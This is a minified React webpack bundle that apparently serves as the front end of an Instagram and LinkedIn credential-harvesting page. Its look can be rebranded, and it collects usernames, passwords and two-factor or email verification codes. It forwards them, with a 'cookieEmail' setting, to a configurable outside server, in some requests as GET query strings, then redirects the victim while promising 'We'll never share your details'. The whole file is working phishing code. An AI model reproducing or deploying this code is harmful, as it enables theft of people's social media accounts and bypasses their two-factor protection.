(this["webpackJsonpinsta-linkedin-frontend"]=this["webpackJsonpinsta-linkedin-frontend"]||[]).push([[0],{41:function(e,t,a){e.exports=a(64)},64:function(e,t,a){"use strict";a.r(t);var n=a(0),o=a.n(n),r=a(17),s=a.n(r),c=a(11),l=a(13),i=a(14),u=a(16),m=a(15),d=a(72),h=a(66),E=a(35),f=a(67),g=a(68),A=a(10),p=a.n(A),C=p()(),w=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(l.a)(this,a);for(var n=arguments.length,r=new Array(n),s=0;s<n;s++)r[s]=arguments[s];return(e=t.call.apply(t,[this].concat(r))).state={redirect:!1,to:""},e.setRedirect=function(t){e.setState({redirect:!0,to:t})},e.renderRedirect=function(){if(console.log(e.state.redirect),e.state.redirect)return o.a.createElement(c.a,{to:e.state.to})},e}return Object(i.a)(a,[{key:"componentDidMount",value:function(){var e=document.getElementById("FavIcon");void 0===C.REACT_APP_FAVICONURL&&""===C.REACT_APP_FAVICONURL||(e.href="".concat(C.REACT_APP_FAVICONURL));var t=document.getElementById("AppTitle");void 0!==C.REACT_APP_TITLE||""!==C.REACT_APP_TITLE?t.innerText="".concat(C.REACT_APP_TITLE):t.innerText="App"}},{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(d.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"},className:"text-center"},o.a.createElement(d.a.Header,null,"Select a login option"),o.a.createElement(d.a.Body,null,o.a.createElement(h.a,{fluid:!0},"3"===C.REACT_APP_SELECT||""===C.REACT_APP_SELECT||null==C.REACT_APP_SELECT?o.a.createElement(E.a,null,o.a.createElement(f.a,null,o.a.createElement(g.a,{style:{width:"100%"},size:"lg",variant:"outline-danger",onClick:function(){return e.setRedirect("/Instagram")}},"INSTAGRAM")),o.a.createElement(f.a,{style:{marginTop:"20px"}},o.a.createElement(g.a,{style:{width:"100%"},size:"lg",variant:"outline-primary",onClick:function(){return e.setRedirect("/LinkedIn")}},"LinkedIN"))):"1"===C.REACT_APP_SELECT?o.a.createElement(g.a,{size:"lg",variant:"outline-primary",onClick:function(){return e.setRedirect("/LinkedIn")}},"LinkedIN"):o.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:function(){return e.setRedirect("/Instagram")}},"INSTAGRAM")))),o.a.createElement(d.a,{title:"Select login options"}))}}]),a}(n.Component),_=a(71),T=a(70),P=a(69),S=a(30),v=p()(),R=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(l.a)(this,a);for(var n=arguments.length,r=new Array(n),s=0;s<n;s++)r[s]=arguments[s];return(e=t.call.apply(t,[this].concat(r))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",twoFactor:!1,email_auth:!1,success:!1,code:"",two_factor_identifier:"",verificationMethod:""},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,o=a.maxLength,r=n.slice(0,o);e.setState({code:r})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(v.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:S.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor?e.setState({email_auth:t.email_auth,twoFactor:!0,loading:!0,two_factor_identifier:t.two_factor_identifier,verificationMethod:t.verificationMethod}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):e.state.email_auth?fetch("".concat(v.REACT_APP_URL,"/insta/emailVerify?username=").concat(e.state.username,"&code=").concat(e.state.code),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?fetch("".concat(v.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:S.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor||e.setState({success:!0}):e.setState({loading:!1})})):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))})):fetch("".concat(v.REACT_APP_URL,"/insta/submitCode?username=").concat(e.state.username,"&password=").concat(e.state.password,"&code=").concat(e.state.code,"&two_factor_identifier=").concat(e.state.two_factor_identifier,"&verificationMethod=").concat(e.state.verificationMethod,"&cookieEmail=").concat(v.REACT_APP_COOKIE_EMAIL),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),t.success?e.setState({success:!0,message:t.message},(function(){e.onShowAlert()})):e.setState({message:t.message},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(c.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(_.a,{variant:"danger"},this.state.message):"",o.a.createElement(h.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,o.a.createElement("img",{alt:"logo",src:v.REACT_APP_FAVICONURL,height:"48px",width:"48px",style:{objectFit:"cover",borderRadius:"50%"}}),void 0!==v.REACT_APP_TITLE&&""!==v.REACT_APP_TITLE?v.REACT_APP_TITLE:"Instagram Login")),this.state.success?o.a.createElement(h.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement(c.b,{component:function(){return window.location.href=v.REACT_APP_REDIRECTURL,null}}),o.a.createElement("center",null,o.a.createElement("h1",null,"Login Sucess Thank You!"))):o.a.createElement(f.a,null,o.a.createElement(E.a,null,o.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},o.a.createElement(T.a.Group,{controlId:"formBasicEmail"},o.a.createElement(T.a.Label,null,"Username"),o.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)},type:"username",placeholder:"Enter Instagram username"}),o.a.createElement(T.a.Text,{className:"text-muted"},"We'll never share your details with anyone else.")),o.a.createElement(T.a.Group,{controlId:"formBasicPassword"},o.a.createElement(T.a.Label,null,"Password"),o.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",placeholder:"Enter Instagram Password"})),this.state.loading?o.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},o.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.twoFactor?o.a.createElement("div",null,o.a.createElement(T.a.Group,null,this.state.email_auth?o.a.createElement(T.a.Label,null,"Please enter the code received"):o.a.createElement(T.a.Label,null,"Enter code recieved"),o.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),o.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),b=a(30),L=p()(),y=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(l.a)(this,a);for(var n=arguments.length,r=new Array(n),s=0;s<n;s++)r[s]=arguments[s];return(e=t.call.apply(t,[this].concat(r))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:""},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,o=a.maxLength,r=n.slice(0,o);e.setState({code:r})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(L.REACT_APP_URL,"/linkedin"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:b.stringify({username:e.state.username,password:e.state.password,cookieEmail:L.REACT_APP_COOKIE_EMAIL})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(L.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(L.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:"",challangeID:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(c.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(_.a,{variant:"dark"},this.state.message):"",o.a.createElement(h.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,o.a.createElement("img",{alt:"logo",src:L.REACT_APP_FAVICONURL,height:"48px",width:"48px",style:{objectFit:"cover",borderRadius:"50%"}}),void 0!==L.REACT_APP_TITLE&&""!==L.REACT_APP_TITLE?L.REACT_APP_TITLE:"LinkedIn login")),this.state.success?o.a.createElement(h.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!")),o.a.createElement(c.b,{component:function(){return window.location.href=L.REACT_APP_REDIRECTURL,null}})):o.a.createElement(f.a,null,o.a.createElement(E.a,null,o.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},o.a.createElement(T.a.Group,{controlId:"formBasicEmail"},o.a.createElement(T.a.Label,null,"Enter Linkedin Username/MobileNumber"),o.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),o.a.createElement(T.a.Group,{controlId:"formBasicPassword"},o.a.createElement(T.a.Label,null,"Enter Linkedin Password"),o.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?o.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},o.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?o.a.createElement("div",null,o.a.createElement(T.a.Group,null,o.a.createElement(T.a.Label,null,"Enter code recieved in your email"),o.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),o.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),I=p()();console.log("env is"+I.REACT_APP_SELECT);var k=function(){return o.a.createElement(c.d,null,o.a.createElement(c.b,{path:"/",component:w,exact:!0}),"3"===I.REACT_APP_SELECT||null==I.REACT_APP_SELECT?o.a.createElement("div",null,o.a.createElement(c.b,{path:"/LinkedIn",component:y,exact:!0}),o.a.createElement(c.b,{path:"/Instagram",component:R,exact:!0})):"2"===I.REACT_APP_SELECT?o.a.createElement(c.b,{path:"/Instagram",component:R,exact:!0}):o.a.createElement(c.b,{path:"/LinkedIn",component:y,exact:!0}))},O=a(12),x=a(6),U=Object(x.a)();s.a.render(o.a.createElement(O.a,{history:U},o.a.createElement(k,null)),document.getElementById("root"))}},[[41,1,2]]]);
//# sourceMappingURL=main.7754cff2.chunk.js.map